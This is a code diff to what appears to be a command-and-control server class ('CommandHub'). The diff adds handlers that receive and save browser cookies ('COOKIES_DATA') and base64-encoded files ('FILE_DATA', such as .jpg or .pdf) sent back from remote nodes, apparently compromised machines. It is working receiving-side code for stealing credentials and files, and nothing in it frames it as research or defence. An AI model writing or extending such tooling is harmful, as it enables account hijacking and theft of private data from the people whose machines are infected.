@@ -497,6 +497,20 @@ class CommandHub:
                     self._handle_status_report(msg[7:], client_id)
                 elif msg == "PING_OK":
                     continue
+                # To catch the JSON cookies
+                elif "COOKIES_DATA" in msg:
+                    _, size, content = msg.split("|", 2)
+                    with open(f"cookies_{node_id}.json", "w") as f:
+                        f.write(content)
+                    print(f"[+] Saved {size} bytes to cookies_{node_id}.json")
+                
+                # To catch binary files (.jpg / .pdf)
+                elif "FILE_DATA" in msg:
+                    _, filename, filedata = msg.split("|", 2)
+                    with open(f"DOWNLOADED_{filename}", "wb") as f:
+                        f.write(base64.b64decode(filedata))
+                    print(f"[+] File {filename} received and saved.")
+                
                 else:
                     with self.output_lock:
                         print(f"\n[?] Message from {node_id}: {msg}")
